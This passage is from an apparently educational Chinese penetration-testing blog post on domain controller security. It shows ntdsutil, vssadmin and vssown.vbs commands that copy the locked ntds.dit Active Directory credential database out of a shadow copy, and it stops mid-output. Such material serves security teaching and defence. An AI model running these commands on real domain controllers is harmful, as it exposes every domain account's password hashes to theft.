<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.0.2"><link rel="apple-touch-icon" sizes="180x180" href="/images/01.jpg"><link rel="icon" type="image/png" sizes="32x32" href="/images/01.jpg"><link rel="icon" type="image/png" sizes="16x16" href="/images/01.jpg"><link rel="mask-icon" href="/images/logo.svg" color="#222"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="google-site-verification" content="h6ecMlAUCMDTIJmEha3N3mJmMydid5XY8AbS767rKtM"><meta name="baidu-site-verification" content="T0YB7GSdOB"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><script class="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"lunamoore.github.io",root:"/",scheme:"Muse",version:"8.0.0-rc.5",exturl:!0,sidebar:{position:"left",display:"post",padding:18,offset:12},copycode:!0,bookmark:{enable:!1,color:"#222",save:"auto"},fancybox:!0,mediumzoom:!1,lazyload:!1,pangu:!1,comments:{style:"tabs",active:null,storage:!0,lazyload:!1,nav:null},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"fadeInDown",post_body:"fadeInDown",coll_header:"fadeInLeft",sidebar:"fadeInUp"}},prism:!1,path:"search.xml",localsearch:{enable:!0,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1}}</script><meta name="description" content="在通常情况下、即使拥有管理员权限,也无法读取域控制器中的C:\Windwos\NTDS\ntds.dit文件(活动目录始终访问这个文件，所以文件被禁止读取)。使用Windows本地卷影拷贝服务可以获得文件的副本。  0x01.(域控中)卷影拷贝服务提取ntds.dit1在活动目录中,所有的数据都保存在 ntds.dit文件中。ntds.dit是一个二进制文件,存储位置为域控制器的%SystemR"><meta property="og:type" content="article"><meta property="og:title" content="内网渗透测试-域控制器安全"><meta property="og:url" content="https://lunamoore.github.io/2021/09/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/index.html"><meta property="og:site_name" content="Lluna&#39;s Pure land."><meta property="og:description" content="在通常情况下、即使拥有管理员权限,也无法读取域控制器中的C:\Windwos\NTDS\ntds.dit文件(活动目录始终访问这个文件，所以文件被禁止读取)。使用Windows本地卷影拷贝服务可以获得文件的副本。  0x01.(域控中)卷影拷贝服务提取ntds.dit1在活动目录中,所有的数据都保存在 ntds.dit文件中。ntds.dit是一个二进制文件,存储位置为域控制器的%SystemR"><meta property="og:locale" content="zh_CN"><meta property="article:published_time" content="2021-09-06T12:36:48.000Z"><meta property="article:modified_time" content="2021-09-06T12:38:08.077Z"><meta property="article:author" content="Lluna"><meta property="article:tag" content="windows"><meta property="article:tag" content="内网安全"><meta name="twitter:card" content="summary"><link rel="canonical" href="https://lunamoore.github.io/2021/09/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/"><script class="page-configurations">CONFIG.page={sidebar:"",isHome:!1,isPost:!0,lang:"zh-CN"}</script><title>内网渗透测试-域控制器安全 | Lluna's Pure land.</title><noscript><style>body{margin-top:2rem}.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header,.use-motion .sidebar{visibility:visible}.use-motion .footer,.use-motion .header,.use-motion .site-brand-container .toggle{opacity:initial}.use-motion .custom-logo-image,.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line{transform:scaleX(1)}.search-pop-overlay,.sidebar-nav{display:none}.sidebar-panel{display:block}</style></noscript><link rel="alternate" href="/atom.xml" title="Lluna's Pure land." type="application/atom+xml"></head><body itemscope itemtype="http://schema.org/WebPage" class="use-motion"><div class="headband"></div><main class="main"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="切换导航栏"><span class="toggle-line"></span> <span class="toggle-line"></span> <span class="toggle-line"></span></div></div><div class="site-meta"><a href="/" class="brand" rel="start"><i class="logo-line"></i><h1 class="site-title">Lluna's Pure land.</h1><i class="logo-line"></i></a><p class="site-subtitle" itemprop="description">What is life like when singing to wine?</p></div><div class="site-nav-right"><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class="site-nav"><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home // 首页 fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user // 关于 fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags // 标签 fa-fw"></i>标签<span class="badge">12</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th // 分类 fa-fw"></i>分类<span class="badge">16</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive // 归档 fa-fw"></i>归档<span class="badge">52</span></a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索</a></li></ul></nav><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"><input autocomplete="off" autocapitalize="off" maxlength="80" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span></div><div class="search-result-container"><div class="no-result"><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></div><div class="toggle sidebar-toggle"><span class="toggle-line"></span> <span class="toggle-line"></span> <span class="toggle-line"></span></div><aside class="sidebar"><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class="sidebar-nav"><li class="sidebar-nav-toc">文章目录</li><li class="sidebar-nav-overview">站点概览</li></ul><section class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%9F%9F%E6%8E%A7%E4%B8%AD-%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D%E6%9C%8D%E5%8A%A1%E6%8F%90%E5%8F%96ntds-dit"><span class="nav-number">1.</span> <span class="nav-text">0x01.(域控中)卷影拷贝服务提取ntds.dit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E4%BD%BF%E7%94%A8ntdsutil-exe%E6%8F%90%E5%8F%96ntds-dit"><span class="nav-number">1.1.</span> <span class="nav-text">1.使用ntdsutil.exe提取ntds.dit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E4%BD%BF%E7%94%A8vssadmin%E6%8F%90%E5%8F%96ntds-dit"><span class="nav-number">1.2.</span> <span class="nav-text">2.使用vssadmin提取ntds.dit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E4%BD%BF%E7%94%A8vssown-vbs%E8%84%9A%E6%9C%AC%E6%8F%90%E5%8F%96ntds-dit"><span class="nav-number">1.3.</span> <span class="nav-text">3.使用vssown.vbs脚本提取ntds.dit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E4%BD%BF%E7%94%A8ntdsutil%E7%9A%84iFM%E5%88%9B%E5%BB%BA%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D"><span class="nav-number">1.4.</span> <span class="nav-text">4.使用ntdsutil的iFM创建卷影拷贝</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E4%BD%BF%E7%94%A8diskshadow%E5%AF%BC%E5%87%BAntds-dit"><span class="nav-number">1.5.</span> <span class="nav-text">5.使用diskshadow导出ntds.dit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E7%9B%91%E6%8E%A7%E5%8D%B7%E5%BD%B1%E6%8B%B7%E8%B4%9D%E6%9C%8D%E5%8A%A1%E7%9A%84%E4%BD%BF%E7%94%A8%E6%83%85%E5%86%B5"><span class="nav-number">1.6.</span> <span class="nav-text">6.监控卷影拷贝服务的使用情况</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E5%AF%BC%E5%87%BAntds-dit%E4%B8%AD%E7%9A%84%E6%95%A3%E5%88%97%E5%80%BC"><span class="nav-number">2.</span> <span class="nav-text">0x02.导出ntds.dit中的散列值</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E4%BD%BF%E7%94%A8esedbexport%E6%81%A2%E5%A4%8Dntds-dit"><span class="nav-number">2.1.</span> <span class="nav-text">1.使用esedbexport恢复ntds.dit</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#01-%E5%AF%BC%E5%87%BAntds-dit"><span class="nav-number">2.1.1.</span> <span class="nav-text">01.导出ntds.dit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#02-%E5%AF%BC%E5%87%BA%E6%95%A3%E5%88%97%E5%80%BC"><span class="nav-number">2.1.2.</span> <span class="nav-text">02.导出散列值</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-impacket%E5%B7%A5%E5%85%B7%E5%8C%85%E5%AF%BC%E5%87%BA%E6%95%A3%E5%88%97%E5%80%BC"><span class="nav-number">2.2.</span> <span class="nav-text">2.impacket工具包导出散列值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-windows%E4%B8%8B%E8%A7%A3%E6%9E%90ntds-dit%E5%B9%B6%E5%AF%BC%E5%87%BA%E5%9F%9F%E8%B4%A6%E5%8F%B7%E5%92%8C%E5%9F%9F%E6%95%A3%E5%88%97%E5%80%BC"><span class="nav-number">2.3.</span> <span class="nav-text">3.windows下解析ntds.dit并导出域账号和域散列值</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E4%BD%BF%E7%94%A8dcsync%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%95%A3%E5%88%97%E5%80%BC"><span class="nav-number">3.</span> <span class="nav-text">0x03.使用dcsync获取域散列值</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-mimikatz%E4%B8%AD%E7%9A%84dcsync%E5%8A%9F%E8%83%BD%EF%BC%88%E9%9C%80%E8%A6%81%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%EF%BC%89"><span class="nav-number">3.1.</span> <span class="nav-text">1.mimikatz中的dcsync功能（需要域管理员权限）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Invoke-DCSync-ps1%E8%84%9A%E6%9C%AC"><span class="nav-number">3.2.</span> <span class="nav-text">2.Invoke-DCSync.ps1脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E4%BD%BF%E7%94%A8msf%E8%8E%B7%E5%8F%96%E6%95%A3%E5%88%97%E5%80%BC"><span class="nav-number">4.</span> <span class="nav-text">0x04.使用msf获取散列值</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-psexec-ntdsgrab%E6%A8%A1%E5%9D%97"><span class="nav-number">4.1.</span> <span class="nav-text">1.psexec_ntdsgrab模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-meterpreter%E4%BC%9A%E8%AF%9D%E8%8E%B7%E5%8F%96%E5%9F%9F%E8%B4%A6%E5%8F%B7%E5%92%8C%E5%9F%9F%E6%95%A3%E5%88%97%E5%80%BC"><span class="nav-number">4.2.</span> <span class="nav-text">2.meterpreter会话获取域账号和域散列值</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-vshadow-exe%E5%92%8CQuarksPwDump-exe%E5%AF%BC%E5%87%BA%E5%9F%9F%E8%B4%A6%E5%8F%B7%E5%92%8C%E6%95%A3%E5%88%97%E5%80%BC"><span class="nav-number">5.</span> <span class="nav-text">0x05.vshadow.exe和QuarksPwDump.exe导出域账号和散列值</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-Kerberos%E5%9F%9F%E7%94%A8%E6%88%B7%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">6.</span> <span class="nav-text">0x06.Kerberos域用户提权漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-PyKEK%E5%B7%A5%E5%85%B7%E5%8C%85"><span class="nav-number">6.1.</span> <span class="nav-text">1.PyKEK工具包</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-goldenPac-py"><span class="nav-number">6.2.</span> <span class="nav-text">2.goldenPac.py</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-msf%E6%A8%A1%E5%9D%97%E5%88%A9%E7%94%A8"><span class="nav-number">6.3.</span> <span class="nav-text">3.msf模块利用</span></a></li></ol></li></ol></div></section><section class="site-overview-wrap sidebar-panel"><div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" alt="Lluna" src="/images/01.jpg"><p class="site-author-name" itemprop="name">Lluna</p><div class="site-description" itemprop="description">A primary school student in the field of Cyberspace Security!</div></div><div class="site-state-wrap animated"><nav class="site-state"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">52</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">16</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/"><span class="site-state-item-count">12</span> <span class="site-state-item-name">标签</span></a></div></nav></div><div class="links-of-author animated"><span class="links-of-author-item"><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x1bmFtb29yZQ==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;lunamoore"><i class="fab fa-github fa-fw"></i></span> </span><span class="links-of-author-item"><span class="exturl" data-url="bWFpbHRvOmppeWViYWxhYmFsYUAxMjYuY29t" title="E-Mail → mailto:jiyebalabala@126.com"><i class="fa fa-envelope fa-fw"></i></span></span></div><div class="cc-license animated" itemprop="license"><span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></span></div><div class="links-of-blogroll animated"><div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i> 友链</div><ul class="links-of-blogroll-list"><li class="links-of-blogroll-item"><span class="exturl" data-url="aHR0cHM6Ly92YWxlY2FzZWMuZ2l0aHViLmlv" title="https:&#x2F;&#x2F;valecasec.github.io">valecalida's house</span></li></ul></div></section></div></aside><div class="sidebar-dimmer"></div></header><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span>0%</span></div><div class="reading-progress-bar"></div><span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x1bmFtb29yZS8=" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin:130px 106px" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span><noscript><div class="noscript-warning">Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://lunamoore.github.io/2021/09/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/01.jpg"><meta itemprop="name" content="Lluna"><meta itemprop="description" content="A primary school student in the field of Cyberspace Security!"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Lluna's Pure land."></span><header class="post-header"><h1 class="post-title" itemprop="name headline">内网渗透测试-域控制器安全</h1><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2021-09-06 20:36:48" itemprop="dateCreated datePublished" datetime="2021-09-06T20:36:48+08:00">2021-09-06</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2021-09-06 20:38:08" itemprop="dateModified" datetime="2021-09-06T20:38:08+08:00">2021-09-06</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">内网渗透测试</span></a> </span></span><span id="/2021/09/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/" class="post-meta-item leancloud_visitors" data-flag-title="内网渗透测试-域控制器安全" title="阅读次数"><span class="post-meta-item-icon"><i class="far fa-eye"></i> </span><span class="post-meta-item-text">阅读次数：</span> <span class="leancloud-visitors-count"></span> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2021/09/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2021/09/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>19k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>17 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><blockquote><p>在通常情况下、即使拥有管理员权限,也无法读取域控制器中的C:\Windwos\NTDS\ntds.dit文件(活动目录始终访问这个文件，所以文件被禁止读取)。使用Windows本地卷影拷贝服务可以获得文件的副本。</p></blockquote><h2 id="0x01-域控中-卷影拷贝服务提取ntds-dit"><a href="#0x01-域控中-卷影拷贝服务提取ntds-dit" class="headerlink" title="0x01.(域控中)卷影拷贝服务提取ntds.dit"></a>0x01.(域控中)卷影拷贝服务提取ntds.dit</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在活动目录中,所有的数据都保存在 ntds.dit文件中。ntds.dit是一个二进制文件,存储位置为域控制器的%SystemRoot%ntds\ntds.dit。ntds.dit 中包含(但不限于)用户名、散列值、组、GPP、OU等与活动目录相关的信息。它和SAM文件一样，是被Windows操作系统锁定的。本节将介绍如何从系统中导出ntds.dit,以及如何读取ntds.dit中的信息。在一般情况下,系统运维人员会利用卷影拷贝服务（Volume Shadow Copy Service, VSS）实现这些操作。VSS本质上属快照（Snapshot)技术的一种，主要用于备份和恢复（即使目标文件处于锁定状态）。</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="1-使用ntdsutil-exe提取ntds-dit"><a href="#1-使用ntdsutil-exe提取ntds-dit" class="headerlink" title="1.使用ntdsutil.exe提取ntds.dit"></a>1.使用ntdsutil.exe提取ntds.dit</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil.exe是一个为活动目录提供管理机制的命令行工具。使用 ntdsutil.exe,可以维护和管理活动目录数据库、控制单个主机操作、创建应用程序目录分区、删除由未使用活动目录安装向导(DCPromo.exe）成功降级的域控制器留下的元数据等。该工具默认安装在域控制器上、可以在域控制器上直接操作，也可以通过域内机器在域控制器上远程操作。ntdsutil.exe支持的操作系统有 Windows Server 2003、 Windows Server 2008、 Windows Server 2012。</span><br></pre></td></tr></table></figure><p><code>首先创建快照</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br></pre></td></tr></table></figure><p><code>然后加载快照</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;5b7236ab-c45c-43ee-b615-a7cc2149ea5c&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p><code>复制到c盘</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\$SNAP_202109041806_VOLUMEC$\Windows\NTDS\ntds.dit C:\test\ntds.dit</span><br></pre></td></tr></table></figure><p><code>卸载快照并删除</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;unmount &#123;5b7236ab-c45c-43ee-b615-a7cc2149ea5c&#125;&quot; &quot;delete &#123;5b7236ab-c45c-43ee-b615-a7cc2149ea5c&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p><code>列出所有快照</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;List All&quot; quit quit</span><br></pre></td></tr></table></figure><h3 id="2-使用vssadmin提取ntds-dit"><a href="#2-使用vssadmin提取ntds-dit" class="headerlink" title="2.使用vssadmin提取ntds.dit"></a>2.使用vssadmin提取ntds.dit</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadminn是 Windows Server 2008 &amp; Windows 7提供的VSS管理工具，可用于创建和删除卷影拷贝、列出卷影拷贝的信息（只能管理系统 Provider创建的卷影拷贝)、显示已安装的所有卷影拷贝写入程序（writers)和提供程序（providers),以及改变卷影拷贝的存储空间(即所谓的“diff空间”)的大小等。vssadminn 的操作流程和ntdsutil类似</span><br></pre></td></tr></table></figure><p><code>首先创建一个c盘的卷影拷贝</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /for=c:</span><br></pre></td></tr></table></figure><p><code>复制出来</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\windows\NTDS\ntds.dit c:\test\ntds.dit</span><br></pre></td></tr></table></figure><p><code>删除快照</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin delete shadows /for=c: /quiet</span><br></pre></td></tr></table></figure><p><code>列出所有卷影副本</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin List Shadows</span><br></pre></td></tr></table></figure><h3 id="3-使用vssown-vbs脚本提取ntds-dit"><a href="#3-使用vssown-vbs脚本提取ntds-dit" class="headerlink" title="3.使用vssown.vbs脚本提取ntds.dit"></a>3.使用vssown.vbs脚本提取ntds.dit</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssown.vbs脚本的功能和vssadmin类似。vssown.vbs 脚本是由Tim Tomes开发的，可用于创建和删除卷影拷贝，以及启动和停止卷影拷贝服务。可以在命令行环境中执行该脚本。</span><br></pre></td></tr></table></figure><p><code>启动卷影拷贝服务</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /start</span><br></pre></td></tr></table></figure><p><code>创建一个c盘的卷影拷贝</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /create c</span><br></pre></td></tr></table></figure><p><code>列出卷影拷贝</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /list</span><br></pre></td></tr></table></figure><p><code>复制</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\NTDS\ntds.dit c:\test\ntds.dit</span><br></pre></td></tr></table></figure><p><code>删除卷影拷贝</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /delete &#123;17EDE50A-A1B1-48E5-B206-9FA13FED03F0&#125;</span><br></pre></td></tr></table></figure><h3 id="4-使用ntdsutil的iFM创建卷影拷贝"><a href="#4-使用ntdsutil的iFM创建卷影拷贝" class="headerlink" title="4.使用ntdsutil的iFM创建卷影拷贝"></a>4.使用ntdsutil的iFM创建卷影拷贝</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">除了按照前面介绍的方法通过执行命令来提取ntds dit,也可以使用创建一个 IFM的方式获取nsdi。在使用ntdsutil创建IFM时，需要进行生成快照、加载、将ntds. dit和计算机的SAM文件复制到目标文件夹中等操作。这些操作也可以通过PowerShell或WMI远程执行</span><br></pre></td></tr></table></figure><p><code>域控管理员输入如下命令</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:/demo&quot; quit quit</span><br><span class="line"></span><br><span class="line">C:\&gt;ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:/demo&quot; quit quit</span><br><span class="line">ntdsutil: ac i ntds</span><br><span class="line">活动实例设置为“ntds”。</span><br><span class="line">ntdsutil: ifm</span><br><span class="line">ifm: create full c:/demo</span><br><span class="line">正在创建快照...</span><br><span class="line">成功生成快照集 &#123;65b13a1d-a952-4257-8255-46531847bb28&#125;。</span><br><span class="line">快照 &#123;b7140919-a826-455f-ad0d-fb548281da5c&#125; 已作为 C:\$SNAP_202109041835_VOLUMEC$\ 装载</span><br><span class="line">已装载快照 &#123;b7140919-a826-455f-ad0d-fb548281da5c&#125;。</span><br><span class="line">正在启动碎片整理模式...</span><br><span class="line">     源数据库: C:\$SNAP_202109041835_VOLUMEC$\Windows\NTDS\ntds.dit</span><br><span class="line">     目标数据库: c:\demo\Active Directory\ntds.dit</span><br><span class="line"></span><br><span class="line">                  Defragmentation  Status (omplete)</span><br><span class="line"></span><br><span class="line">          0    10   20   30   40   50   60   